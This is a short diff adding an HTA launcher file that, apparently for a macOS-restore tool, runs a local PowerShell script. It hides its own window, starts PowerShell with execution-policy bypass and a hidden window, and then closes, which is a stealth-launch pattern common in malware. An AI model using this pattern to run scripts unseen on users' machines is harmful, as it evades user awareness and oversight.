@@ -1,0 +1,8 @@
+<HTA:APPLICATION ID="app" WINDOWSTATE="minimize" SHOWINTASKBAR="no" CAPTION="no" BORDER="none"/>
+<script language="JScript">
+    var path = document.location.pathname.replace(/%20/g, " ").replace(/^\//, "");
+    var dir = path.substring(0, path.lastIndexOf("/")).replace(/\//g, "\\");
+    var sa = new ActiveXObject("Shell.Application");
+    sa.ShellExecute("powershell.exe", "-Ep Bypass -WindowStyle Hidden -File \"" + dir + "\\restore-macOSx-from-github.ps1\"", "", "open", 0);
+    window.close();
+</script>
